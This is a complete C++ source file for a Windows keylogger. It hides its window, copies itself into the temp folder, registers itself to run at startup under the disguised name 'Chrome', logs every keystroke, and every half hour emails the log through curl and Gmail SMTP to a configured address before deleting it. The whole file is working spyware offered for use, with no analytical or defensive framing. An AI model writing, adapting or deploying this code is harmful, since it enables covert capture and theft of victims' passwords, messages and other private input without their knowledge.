#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <stdlib.h>
#include <fstream>
#include <ctime>
#include <string>
#include <sstream>
#include <tchar.h>
#include <Lmcons.h>
#include <iostream>



//U should enable less secure apps if u use gmail, https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg
const std::string exe_name = "keylogger.exe";
const std::string LogFileName = "data.th";
const std::string EmailFrom = "example@gmail.com";
const std::string EmailFromPassword = "YourPassowrd";
const std::string EmailTo = "example@gmail.com";



#pragma warning(disable : 4996)


bool test = 1;
bool wymaganie = 1;

using namespace std;




void send() {
	string cmd = "curl.exe smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"";
	cmd += EmailFrom;
	cmd += "\\\" --mail-rcpt \\\"";
	cmd += EmailTo;
	cmd += "\\\" --ssl --upload-file ";
	cmd += "%temp%\\";
	cmd += LogFileName;
	cmd += " -u ";
	cmd += EmailFrom;
	cmd += ":";
	cmd += EmailFromPassword;
	cmd += " -k --anyauth";
	//cout << cmd;
	system(cmd.c_str());

}







inline bool filexits(const std::string& name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}



void autostart() {
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	
	char letter[UNLEN + 1];
	GetSystemDirectory(letter, sizeof(letter));

	string cmd;
	cmd = letter[0];
	cmd += ":\\Users\\";
	cmd += username;
	cmd += "\\AppData\\Local\\Temp\\";
	cmd += exe_name;
	if (!filexits(cmd.c_str())) {
		
		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d "+cmd;
		system(cmd2.c_str());



		fstream file;
		file.open("temp.bat", ios::out);
		file << "taskkill /IM " + exe_name + " /F\n";
		file << "move " + exe_name + " %temp%\n";
		file <<"move curl.exe %temp%\n";
		file << "move curl-ca-bundle.crt %temp%\n";
		file << "move libcurl-x64.def %temp%\n";
		file << "move libcurl-x64.dll %temp%\n";
		file << "start  %temp%\\"+ exe_name;
		file << "\nexit";
		system("start temp.bat");


	}


}


void LOG(string input) {
	fstream LogFile;
	LogFile.open(LogFileName, fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

//special chars
bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		//cout << "$SPACE#";
		LOG(" ");
		return true;
	case VK_RETURN:
	//	cout << "\n";
		LOG("\n");
		return true;
	case '.':
    //cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
	//	cout << "#SHIFT# ";
		LOG(" #SHIFT# ");
		return true;
	case VK_BACK:
	//	cout << " #BACKSPACE# ";
		LOG(" #BACKSPACE# ");
		return true;
	case VK_RBUTTON:
	//	cout << " #R_CLICK# ";
		LOG(" #R_CLICK# ");
		return true;
	case VK_CAPITAL:
	//	cout << " #CAPS_LOCK# ";
		LOG(" #CAPS_LOCK# ");
		return true;
	case VK_TAB:
	//	cout << "#TAB#";
		LOG(" #TAB# ");
		return true;
	case VK_UP:
	//	cout << "#UP#";
		LOG(" #UP_ARROW# ");
		return true;
	case VK_DOWN:
	//	cout << "#DOWN#";
		LOG(" #DOWN_ARROW# ");
		return true;
	case VK_LEFT:
	//	cout << "#LEFT#";
		LOG(" #LEFT_ARROW# ");
		return true;
	case VK_RIGHT:
	//	cout << " #RIGHT# ";
		LOG(" #RIGHT_ARROW# ");
		return true;
	case VK_CONTROL:
	//	cout << "#CONTROL#";
		LOG(" #CONTROL_ARROW# ");
		return true;
	case VK_MENU:
	//	cout << "#ALT#";
		LOG(" #ALT# ");
		return true;
	default:
		return false;
	}
}







int main()
{
	Sleep(500);
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	fstream LogFile;
	LogFile.open(LogFileName, fstream::app);
	LogFile.close();
    autostart();
	send();
	
	string jd;
	string jd2;
	int wynik;
	string wynik2;
	string linia;
	char KEY = 'x';
	LogFile.open(LogFileName, fstream::app);



	time_t t;
	struct tm* tt;
	time(&t);
	tt = localtime(&t);
	//Log at start of program
	LogFile << endl <<"###" << asctime(tt);
	wynik2 = asctime(tt)[0];
	LogFile.close();


	while (true) {
		time_t t;

		struct tm* tt;
		time(&t);
		tt = localtime(&t);
		jd = asctime(tt)[15];
		jd2 = asctime(tt)[14] + jd;
		istringstream iss(jd2);
		iss >> wynik;
		if ((wynik == 00) && (test == 1) || (wynik == 30) && (test == 1))
		{
			//saving data every half an hour
			
			fstream LogFile;
			LogFile.open(LogFileName, fstream::app);
			LogFile << endl <<"#|#" << asctime(tt);
			LogFile.close();
			send();
			remove(LogFileName.c_str());
			test = 0;
		}
		if ((wynik != 00) && (wynik != 30))
		{
			test = 1;
		}
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{// reading chars

			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					//Log to LogFileName
					fstream LogFile;
					LogFile.open(LogFileName, fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}
